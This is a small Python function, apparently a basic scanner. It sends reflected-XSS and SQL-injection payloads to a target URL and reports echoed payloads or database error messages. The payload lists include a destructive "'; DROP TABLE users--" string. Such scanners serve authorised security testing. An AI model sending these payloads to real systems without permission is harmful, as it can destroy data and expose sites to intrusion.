import requests
import re

def check(url):
    results = []
    try:
        # XSS payloads
        xss_payloads = [
            "<script>alert(1)</script>",
            "'\"><img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>"
        ]

        # SQLi payloads
        sqli_payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "' UNION SELECT null--",
            "'; DROP TABLE users--"
        ]

        # Common SQL error regex patterns
        sql_errors = [
            "SQL syntax.*MySQL",
            "Warning.*mysql_",
            "PostgreSQL.*ERROR",
            "Microsoft SQL Server.*Driver",
            "System.Data.SqlClient.SqlException",
            "Oracle.*ORA-"
        ]

        # Test XSS
        for payload in xss_payloads:
            try:
                r = requests.get(url, params={"q": payload}, timeout=5, headers={"User-Agent": "AdvancedScanner/1.0"})
                if payload in r.text:
                    results.append(f"[!] Reflected XSS detected with payload: {payload}")
            except requests.RequestException:
                continue

        # Test SQLi
        for payload in sqli_payloads:
            try:
                r = requests.get(url, params={"id": payload}, timeout=5, headers={"User-Agent": "AdvancedScanner/1.0"})
                for err in sql_errors:
                    if re.search(err, r.text, re.IGNORECASE):
                        results.append(f"[!] SQL Injection error-based detected with payload: {payload}")
                        break
            except requests.RequestException:
                continue

        if results:
            return "\n".join(results)
        return "[+] No basic XSS/SQL Injection detected"

    except Exception as e:
        return f"[ERROR] {e}"

